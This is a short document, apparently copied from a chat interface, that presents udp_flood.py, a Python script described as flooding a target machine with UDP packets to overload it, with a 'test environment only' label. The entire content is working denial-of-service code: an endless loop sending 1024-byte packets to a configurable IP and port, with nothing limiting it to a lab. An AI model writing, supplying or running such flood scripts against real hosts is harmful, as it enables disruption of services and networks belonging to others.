udp_flood.py
A Python script that performs a UDP flood to overload the target machine (test environment only).

python
Copy
Edit
# udp_flood.py

import socket
target = "192.168.1.5"  # Replace with the target IP
port = 80               # Use the target port (e.g., HTTP)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = b"A" * 1024      # Craft the packet to send
while True:
    sock.sendto(data, (target, port))  # Send packet
